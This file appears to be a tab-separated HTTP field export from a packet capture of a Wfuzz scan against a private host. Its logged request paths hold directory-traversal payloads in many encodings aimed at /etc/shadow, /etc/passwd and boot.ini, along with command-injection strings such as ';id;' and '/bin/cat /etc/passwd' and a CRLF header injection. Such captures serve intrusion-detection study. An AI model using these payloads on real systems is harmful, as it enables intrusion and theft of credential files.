http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web//../../../../../../../../../../etc/shadow^^/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web//../../../../../../../../../../etc/shadow^^/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									1395,1395,1395,1395,1395,1395,1395,1395						1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/A/,http://192.168.1.109/web/00/,http://192.168.1.109/web/NULL/,http://192.168.1.109/web/$NULL/,http://192.168.1.109/web/&quot;;id&quot;/,http://192.168.1.109/web/|dir|/,http://192.168.1.109/web//boot.ini/,http://192.168.1.109/web//..\../..\../..\../..\../..\../..\../etc/shadow/,http://192.168.1.109/web//../../../../../../../../bin/id|/		GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/A/,/web/00/,/web/NULL/,/web/$NULL/,/web/&quot;;id&quot;/,/web/|dir|/,/web//boot.ini/,/web//..\../..\../..\../..\../..\../..\../etc/shadow/,/web//../../../../../../../../bin/id|/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									1426						1,1	http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\etc\shadow/,http://192.168.1.109/web/../../../../../../../../conf/server.xml/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..\..\..\..\..\..\..\..\..\..\etc\shadow/,/web/../../../../../../../../conf/server.xml/
*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									1522,1522,1522,1522,1522						1,1,1,1,1,1	http://192.168.1.109/web/;netstat%20-a;/,http://192.168.1.109/web/?x=>/,http://192.168.1.109/web/\..\..\..\..\..\..\..\..\..\..\etc\shadow/,http://192.168.1.109/web//..\../..\../..\../..\../..\../..\../etc/passwd/,http://192.168.1.109/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,http://192.168.1.109/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow/		GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/;netstat%20-a;/,/web/?x=>/,/web/\..\..\..\..\..\..\..\..\..\..\etc\shadow/,/web//..\../..\../..\../..\../..\../..\../etc/passwd/,/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									1536						1,1	http://192.168.1.109/web//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,http://192.168.1.109/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00/,/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd/
*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									1589,1589,1589						1,1,1,1	http://192.168.1.109/web//./././././././././././etc/passwd/,http://192.168.1.109/web//../../../../../../../../../../../etc/passwd%00.jpg/,http://192.168.1.109/web//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd/,http://192.168.1.109/web/../../../../../../../../../../../../localstart.asp/		GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web//./././././././././././etc/passwd/,/web//../../../../../../../../../../../etc/passwd%00.jpg/,/web//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd/,/web/../../../../../../../../../../../../localstart.asp/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									1743,1743,1743,1743,1743,1743,1743,1743,1743,1743,1743,1743						1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/FALSE/,http://192.168.1.109/web/TRUE/,http://192.168.1.109/web/\00/,http://192.168.1.109/web/`id`/,http://192.168.1.109/web/|ls/,http://192.168.1.109/web//index.html|id|/,http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\etc\passwd/,http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\etc\shadow%00/,http://192.168.1.109/web/\..\..\..\..\..\..\..\..\..\..\etc\passwd%00/,http://192.168.1.109/web/..\..\..\..\..\..\..\..\..\..\etc\passwd%00/,http://192.168.1.109/web/.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow/,http://192.168.1.109/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini/,http://192.168.1.109/web//../../../../../../../../../../../boot.ini/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/FALSE/,/web/TRUE/,/web/\00/,/web/`id`/,/web/|ls/,/web//index.html|id|/,/web/..\..\..\..\..\..\..\..\..\..\etc\passwd/,/web/..\..\..\..\..\..\..\..\..\..\etc\shadow%00/,/web/\..\..\..\..\..\..\..\..\..\..\etc\passwd%00/,/web/..\..\..\..\..\..\..\..\..\..\etc\passwd%00/,/web/.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow/,/web/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini/,/web//../../../../../../../../../../../boot.ini/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/../../../../../../../../../../../../boot.ini/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/../../../../../../../../../../../../boot.ini/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									1822,1822						1,1,1	http://192.168.1.109/web/C:\inetpub\wwwroot\global.asa/,http://192.168.1.109/web/C:\boot.ini/,http://192.168.1.109/web/%/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/C:\inetpub\wwwroot\global.asa/,/web/C:\boot.ini/,/web/%/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web//,%ENV,//		GET				HTTP/1.1																			Wfuzz/3.1.0				/web//,%ENV,//
*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									1847,1847,1847,1847						1,1,1,1,1	http://192.168.1.109/web//../../../../../../../../../../../boot.ini%00/,http://192.168.1.109/web//../../../../../../../../../../../boot.ini%00.jpg/,http://192.168.1.109/web//../../../../../../../../../../../boot.ini%00.html/,http://192.168.1.109/web//.../.../.../.../...//,http://192.168.1.109/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini/		GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web//../../../../../../../../../../../boot.ini%00/,/web//../../../../../../../../../../../boot.ini%00.jpg/,/web//../../../../../../../../../../../boot.ini%00.html/,/web//.../.../.../.../...//,/web//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2839,2839,2839,2839,2839,2839,2839,2839,2839						1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/../../../../../../../../../../../../localstart.asp%00/,http://192.168.1.109/web/../../../../../../../../../../../../boot.ini%00/,http://192.168.1.109/web/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini/,http://192.168.1.109/web/;/,http://192.168.1.109/web/`/,http://192.168.1.109/web/\'/,http://192.168.1.109/web/,http://192.168.1.109/web/{'}/,http://192.168.1.109/web/%2e%2e%2f/,http://192.168.1.109/web/..%%35c/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/../../../../../../../../../../../../localstart.asp%00/,/web/../../../../../../../../../../../../boot.ini%00/,/web/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini/,/web/;/,/web/`/,/web/\'/,/web/,/web/{'}/,/web/%2e%2e%2f/,/web/..%%35c/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2863,2863,2863,2863,2863,2863,2863,2863						1,1,1,1,1,1,1,1,1	http://192.168.1.109/web//./././././././././././etc/shadow/,http://192.168.1.109/web/\\&apos;/bin/cat%20/etc/passwd\\&apos;/,http://192.168.1.109/web//./././././././././././boot.ini/,http://192.168.1.109/web///,http://192.168.1.109/web/&lt;/,http://192.168.1.109/web/*|/,http://192.168.1.109/web/<?/,http://192.168.1.109/web/!'/,http://192.168.1.109/web/..%bg%qf/		GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web//./././././././././././etc/shadow/,/web/\\&apos;/bin/cat%20/etc/passwd\\&apos;/,/web//./././././././././././boot.ini/,/web///,/web/&lt;/,/web/*|/,/web/<?/,/web/!'/,/web/..%bg%qf/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2888,2888,2888,2888,2888,2888,2888,2888,2888,2888,2888,2888,2888,2888,2888,2888						1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/2/,http://192.168.1.109/web/268435455/,http://192.168.1.109/web/%0a/,http://192.168.1.109/web/;id;/,http://192.168.1.109/web/|id/,http://192.168.1.109/web/?x=/,http://192.168.1.109/web/%0a/bin/cat%20/etc/passwd/,http://192.168.1.109/web//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini/,http://192.168.1.109/web//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow/,http://192.168.1.109/web/%0d%0aX-Injection-Header:%20AttackValue/,http://192.168.1.109/web/\/,http://192.168.1.109/web/||/,http://192.168.1.109/web/^'/,http://192.168.1.109/web/&,http://192.168.1.109/web/,http://192.168.1.109/web/..//,http://192.168.1.109/web/..%u2215/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/2/,/web/268435455/,/web/%0a/,/web/;id;/,/web/|id/,/web/?x=/,/web/%0a/bin/cat%20/etc/passwd/,/web//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini/,/web//..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow/,/web/%0d%0aX-Injection-Header:%20AttackValue/,/web/\/,/web/||/,/web/^'/,/web/&,/web/,/web/..//,/web/..%u2215/
